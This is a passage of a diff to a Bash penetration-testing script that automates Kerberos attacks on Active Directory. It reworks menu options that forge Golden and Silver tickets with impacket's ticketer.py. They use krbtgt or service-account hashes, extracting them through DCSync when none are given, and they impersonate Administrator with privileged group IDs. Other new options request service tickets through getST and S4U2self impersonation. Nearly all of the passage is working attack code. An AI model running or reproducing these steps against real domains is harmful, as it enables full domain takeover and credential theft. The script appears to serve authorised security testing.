-    sid_domain=$(grep -a "Domain SID" "${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" 2>/dev/null | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
+    sid_domain=$(grep -a "Domain SID" "${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" 2>/dev/null | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 7)
     if [[ ${sid_domain} == "" ]]; then
-        run_command "${netexec} ldap ${target} ${argument_ne} --get-sid --log ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" >/dev/null
-        sid_domain=$(grep -a "Domain SID" "${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
+        run_command "${netexec} ldap ${target} ${argument_ne} --get-sid | tee ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" >/dev/null
+        sid_domain=$(grep -a "Domain SID" "${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 7)
     fi
     echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
 }
@@ -4178,12 +4290,14 @@ kerberos_menu() {
     echo -e "7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
     echo -e "8) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
     echo -e "9) Run custom Kerberoast attack using Orpheus"
-    echo -e "10) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)"
-    echo -e "11) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)"
-    echo -e "12) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)"
-    echo -e "13) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)"
-    echo -e "14) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
-    echo -e "15) Request impersonated ticket using Constrained Delegation rights (requires: hash of account allowed for delegation or DCSync rights)"
+    echo -e "10) Request TGS for current user (requires: authenticated)"
+    echo -e "11) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)"
+    echo -e "12) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)"
+    echo -e "13) Request ticket for another user using S4U2self (OPSEC alternative to Silver Ticket) (requires: authenticated session of SPN service account, for example 'svc')"
+    echo -e "14) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)"
+    echo -e "15) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)"
+    echo -e "16) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
+    echo -e "17) Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4241,147 +4355,96 @@ kerberos_menu() {
         ;;
 
     10)
-        if [ ! -f "${impacket_ticketer}" ]; then
-            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        if [ ! -f "${impacket_getST}" ]; then
+            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
         else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
-                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
-                read -rp ">> " rc4_or_aes </dev/tty
-                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
-                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
-                    read -rp ">> " rc4_or_aes </dev/tty
-                done
-                gethash_user="krbtgt"
-                gethash_hash=""
-                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
-                read -rp ">> " gethash_hash </dev/tty
-                if [[ ${gethash_hash} == "" ]]; then
-                    get_hash
-                else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt="$gethash_hash"; else gethash_aes="$gethash_hash"; fi
-                fi
-
-                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
-                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
-                else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
-
-                    tick_randuser="Administrator"
-                    tick_user_id=""
-                    tick_groups=""
-                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):"
-                    read -rp ">> " tick_randuser_value </dev/tty
-                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "${BLUE}[*] Please specify custom user id (press Enter to skip):"
-                    read -rp ">> " tick_user_id_value </dev/tty
-                    if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
-                    echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to skip):"
-                    echo -e "${CYAN}[*] Example: 512,513,518,519,520 ${NC}"
-                    read -rp ">> " tick_group_ids_value </dev/tty
-                    if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
-                    get_domain_sid
-                    while [[ "${sid_domain}" == "" ]]; do
-                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
-                        echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
-                        read -rp ">> " sid_domain </dev/tty
-                    done
-                    echo -e "${CYAN}[*] Generating golden ticket...${NC}"
-                    current_dir=$(pwd)
-                    cd "${output_dir}/Credentials" || exit
-                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
-                    run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
-                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
-                    /bin/mv "./${tick_randuser}.kirbi" "./${tick_randuser}_golden.kirbi" 2>/dev/null
-                    cd "${current_dir}" || exit
-                    if [ -f "${output_dir}/Credentials/${tick_randuser}_golden.ccache" ]; then
-                        echo -e "${GREEN}[+] Golden ticket generated successfully:${NC}"
-                        echo -e "${output_dir}/Credentials/${tick_randuser}_golden.ccache"
-                        echo -e "${output_dir}/Credentials/${tick_randuser}_golden.kirbi"
-                    else
-                        echo -e "${RED}[-] Failed to generate golden ticket${NC}"
-                    fi
-                fi
+            if [ "${nullsess_bool}" == true ]; then
+                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
             else
-                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+                tick_spn="CIFS/${dc_domain}"
+                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                read -rp ">> " tick_spn_value </dev/tty
+                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
+                echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
+                current_dir=$(pwd)
+                cd "${output_dir}/Credentials" || exit
+                run_command "${impacket_getST} ${argument_imp} -dc-ip ${dc_ip} -spn ${tick_spn}" | tee -a "${output_dir}/Credentials/getST_output_${dc_domain}"
+                ticket_ccache_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
+                ticket_kirbi_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
+                run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
+                cd "${current_dir}" || exit
+                if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
+                    echo -e "${GREEN}[+] TGS for SPN ${tick_spn} generated successfully:${NC} $krb_ticket"
+                    echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
+                    echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
+                else
+                    echo -e "${RED}[-] Failed to request ticket${NC}"
+                fi
             fi
+
         fi
         kerberos_menu
         ;;
-
+    
     11)
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
-                tick_randuser="Administrator"
-                tick_randuserid=""
-                tick_spn="CIFS/${dc_domain}"
-                tick_groups=""
-                tick_servuser=""
-
-                echo -e "${BLUE}[*] Please specify name of SPN account (Example: 'sql_svc'):"
-                read -rp ">> " tick_servuser </dev/tty
-                while [[ "${tick_servuser}" == "" ]]; do
-                    echo -e "${RED}Invalid username.${NC} Please specify another:"
-                    read -rp ">> " tick_servuser </dev/tty
-                done
-
-                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+            read -rp ">> " rc4_or_aes </dev/tty
+            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
                 read -rp ">> " rc4_or_aes </dev/tty
-                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
-                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
-                    read -rp ">> " rc4_or_aes </dev/tty
-                done
-                gethash_hash=""
-                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
-                read -rp ">> " gethash_hash </dev/tty
-                if [[ ${gethash_hash} == "" ]]; then
-                    gethash_user=$tick_servuser
-                    get_hash
-                else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
-                fi
-
-                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
-                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
-                else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
-
-                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):"
-                    read -rp ">> " tick_randuser_value </dev/tty
-                    if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "${BLUE}[*] Please specify the chosen user's ID (press Enter to choose default value EMPTY):"
-                    read -rp ">> " tick_randuserid_value </dev/tty
-                    if [[ ! "${tick_randuserid_value}" == "" ]]; then tick_randuserid="-user-id ${tick_randuserid_value}"; fi
-                    echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
-                    read -rp ">> " tick_spn_value </dev/tty
-                    if [[ ! "${tick_spn_value}" == "" ]]; then tick_spn="${tick_spn_value}"; fi
-                    get_domain_sid
-                    while [[ "${sid_domain}" == "" ]]; do
-                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
-                        echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
-                        read -rp ">> " sid_domain </dev/tty
-                    done
-                    echo -e "${CYAN}[*] Generating silver ticket for service $tick_spn_value...${NC}"
-                    current_dir=$(pwd)
-                    cd "${output_dir}/Credentials" || exit
-                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuserid} ${tick_randuser}"
-                    ticket_ccache_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').ccache"
-                    ticket_kirbi_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').kirbi"
-                    run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
-                    /bin/mv "./${tick_randuser}.ccache" "./${ticket_ccache_out}" 2>/dev/null
-                    /bin/mv "./${tick_randuser}.kirbi" "./${ticket_kirbi_out}" 2>/dev/null
-                    cd "${current_dir}" || exit
-                    if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
-                        echo -e "${GREEN}[+] Silver ticket generated successfully:${NC}"
-                        echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
-                        echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
-                    else
-                        echo -e "${RED}[-] Failed to generate silver ticket${NC}"
-                    fi
-                fi
+            done
+            gethash_user="krbtgt"
+            gethash_hash=""
+            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
+            read -rp ">> " gethash_hash </dev/tty
+            if [[ ${gethash_hash} == "" ]]; then
+                get_hash
             else
-                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt="$gethash_hash"; else gethash_aes="$gethash_hash"; fi
+            fi
+
+            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+            else
+                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
+
+                tick_randuser="Administrator"
+                tick_user_id=""
+                tick_groups=""
+                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):"
+                read -rp ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "${BLUE}[*] Please specify custom user id (press Enter to skip):"
+                read -rp ">> " tick_user_id_value </dev/tty
+                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
+                echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to skip):"
+                echo -e "${CYAN}[*] Example: 512,513,518,519,520 ${NC}"
+                read -rp ">> " tick_group_ids_value </dev/tty
+                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
+                get_domain_sid
+                while [[ "${sid_domain}" == "" ]]; do
+                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                    echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
+                    read -rp ">> " sid_domain </dev/tty
+                done
+                echo -e "${CYAN}[*] Generating golden ticket...${NC}"
+                current_dir=$(pwd)
+                cd "${output_dir}/Credentials" || exit
+                run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
+                run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
+                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
+                /bin/mv "./${tick_randuser}.kirbi" "./${tick_randuser}_golden.kirbi" 2>/dev/null
+                cd "${current_dir}" || exit
+                if [ -f "${output_dir}/Credentials/${tick_randuser}_golden.ccache" ]; then
+                    echo -e "${GREEN}[+] Golden ticket generated successfully:${NC}"
+                    echo -e "${output_dir}/Credentials/${tick_randuser}_golden.ccache"
+                    echo -e "${output_dir}/Credentials/${tick_randuser}_golden.kirbi"
+                else
+                    echo -e "${RED}[-] Failed to generate golden ticket${NC}"
+                fi
             fi
         fi
         kerberos_menu
@@ -4391,194 +4454,267 @@ kerberos_menu() {
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
-                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
-                read -rp ">> " rc4_or_aes </dev/tty
-                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
-                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
-                    read -rp ">> " rc4_or_aes </dev/tty
-                done
-                gethash_user="krbtgt"
-                gethash_hash=""
-                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
-                read -rp ">> " gethash_hash </dev/tty
-                if [[ ${gethash_hash} == "" ]]; then
-                    get_hash
-                else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
-                fi
+            tick_randuser="Administrator"
+            tick_randuserid=""
+            tick_spn="CIFS/${dc_domain}"
+            tick_groups=""
+            tick_servuser=""
 
-                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
-                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
-                else
-                    gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
-                    tick_randuser="sql_svc"
-                    tick_user_id="1337"
-                    tick_groups="512,513,518,519,520"
-                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):"
-                    read -rp ">> " tick_randuser_value </dev/tty
-                    if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):"
-                    read -rp ">> " tick_user_id_value </dev/tty
-                    if [[ ! "${tick_user_id_value}" == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
-                    echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
-                    read -rp ">> " tick_group_ids_value </dev/tty
-                    if [[ ! "${tick_group_ids_value}" == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
-                    get_domain_sid
-                    while [[ "${sid_domain}" == "" ]]; do
-                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
-                        read -rp ">> " sid_domain </dev/tty
-                    done
-                    echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
-                    current_dir=$(pwd)
-                    cd "${output_dir}/Credentials" || exit
-                    run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
-                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
-                    cd "${current_dir}" || exit
-                    if [ -f "${output_dir}/Credentials/${tick_randuser}_diamond.ccache" ]; then
-                        echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache"
-                    else
-                        echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
-                    fi
-                fi
+            echo -e "${BLUE}[*] Please specify name of SPN account (Example: 'sql_svc'):"
+            read -rp ">> " tick_servuser </dev/tty
+            while [[ "${tick_servuser}" == "" ]]; do
+                echo -e "${RED}Invalid username.${NC} Please specify another:"
+                read -rp ">> " tick_servuser </dev/tty
+            done
+
+            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+            read -rp ">> " rc4_or_aes </dev/tty
+            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                read -rp ">> " rc4_or_aes </dev/tty
+            done
+            gethash_hash=""
+            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
+            read -rp ">> " gethash_hash </dev/tty
+            if [[ ${gethash_hash} == "" ]]; then
+                gethash_user=$tick_servuser
+                get_hash
             else
-                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+            fi
+
+            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+            else
+                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
+
+                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):"
+                read -rp ">> " tick_randuser_value </dev/tty
+                if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "${BLUE}[*] Please specify the chosen user's ID (press Enter to choose default value EMPTY):"
+                read -rp ">> " tick_randuserid_value </dev/tty
+                if [[ ! "${tick_randuserid_value}" == "" ]]; then tick_randuserid="-user-id ${tick_randuserid_value}"; fi
+                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                read -rp ">> " tick_spn_value </dev/tty
+                if [[ ! "${tick_spn_value}" == "" ]]; then tick_spn="${tick_spn_value}"; fi
+                get_domain_sid
+                while [[ "${sid_domain}" == "" ]]; do
+                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                    echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
+                    read -rp ">> " sid_domain </dev/tty
+                done
+                echo -e "${CYAN}[*] Generating silver ticket for service ${tick_spn}...${NC}"
+                current_dir=$(pwd)
+                cd "${output_dir}/Credentials" || exit
+                run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuserid} ${tick_randuser}"
+                ticket_ccache_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').ccache"
+                ticket_kirbi_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').kirbi"
+                run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
+                /bin/mv "./${tick_randuser}.ccache" "./${ticket_ccache_out}" 2>/dev/null
+                /bin/mv "./${tick_randuser}.kirbi" "./${ticket_kirbi_out}" 2>/dev/null
+                cd "${current_dir}" || exit
+                if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
+                    echo -e "${GREEN}[+] Silver ticket generated successfully:${NC}"
+                    echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
+                    echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
+                else
+                    echo -e "${RED}[-] Failed to generate silver ticket${NC}"
+                fi
             fi
         fi
         kerberos_menu
         ;;
 
     13)
-        if [ ! -f "${impacket_ticketer}" ]; then
-            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        if [ ! -f "${impacket_getST}" ]; then
+            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
         else
-            if [ "${pass_bool}" == true ]; then
-                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
-                read -rp ">> " rc4_or_aes </dev/tty
-                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
-                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
-                    read -rp ">> " rc4_or_aes </dev/tty
-                done
-                gethash_user="krbtgt"
-                gethash_hash=""
-                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
-                read -rp ">> " gethash_hash </dev/tty
-                if [[ ${gethash_hash} == "" ]]; then
-                    get_hash
-                else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
-                fi
-
-                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
-                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
-                else
-                    gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
-                    tick_randuser="sql_svc"
-                    tick_user_id="1337"
-                    tick_groups="512,513,518,519,520"
-                    tick_domain_admin="${user}"
-                    echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):"
-                    read -rp ">> " tick_randuser_value </dev/tty
-                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):"
-                    read -rp ">> " tick_user_id_value </dev/tty
-                    if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
-                    echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
-                    read -rp ">> " tick_group_ids_value </dev/tty
-                    if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
-                    echo -e "${BLUE}[*] Please specify domain admin to impersonate (press Enter to choose default value current user):"
-                    read -rp ">> " tick_domain_admin_value </dev/tty
-                    if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
-                    get_domain_sid
-                    while [[ "${sid_domain}" == "" ]]; do
-                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
-                        read -rp ">> " sid_domain </dev/tty
-                    done
-                    echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
-                    current_dir=$(pwd)
-                    cd "${output_dir}/Credentials" || exit
-                    run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
-                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
-                    cd "${current_dir}" || exit
-                    if [ -f "${output_dir}/Credentials/${tick_randuser}_sapphire.ccache" ]; then
-                        echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache"
-                    else
-                        echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
-                    fi
-                fi
+            if [ "${nullsess_bool}" == true ]; then
+                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
             else
-                echo -e "${RED}[-] Error! Requires password...${NC}"
+                tick_randuser="Administrator"
+                tick_spn="CIFS/${dc_domain}"
+
+                echo -e "${BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):"
+                read -rp ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                read -rp ">> " tick_spn_value </dev/tty
+                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
+                echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
+                current_dir=$(pwd)
+                cd "${output_dir}/Credentials" || exit
+                run_command "${impacket_getST} ${argument_imp} -self -impersonate ${tick_randuser} -dc-ip ${dc_ip} -altservice ${tick_spn}" | tee -a "${output_dir}/Credentials/getST_output_${dc_domain}"
+                ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
+                ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
+                run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
+                cd "${current_dir}" || exit
+                if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
+                    echo -e "${GREEN}[+] TGS for SPN ${tick_spn} impersonating ${tick_randuser} generated successfully:${NC} $krb_ticket"
+                    echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
+                    echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
+                else
+                    echo -e "${RED}[-] Failed to request ticket${NC}"
+                fi
             fi
         fi
         kerberos_menu
         ;;
 
     14)
-        raise_child
+        if [ ! -f "${impacket_ticketer}" ]; then
+            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        else
+            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+            read -rp ">> " rc4_or_aes </dev/tty
+            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                read -rp ">> " rc4_or_aes </dev/tty
+            done
+            gethash_user="krbtgt"
+            gethash_hash=""
+            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
+            read -rp ">> " gethash_hash </dev/tty
+            if [[ ${gethash_hash} == "" ]]; then
+                get_hash
+            else
+                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+            fi
+
+            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+            else
+                gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
+                tick_randuser="sql_svc"
+                tick_user_id="1337"
+                tick_groups="512,513,518,519,520"
+                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                read -rp ">> " tick_randuser_value </dev/tty
+                if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):"
+                read -rp ">> " tick_user_id_value </dev/tty
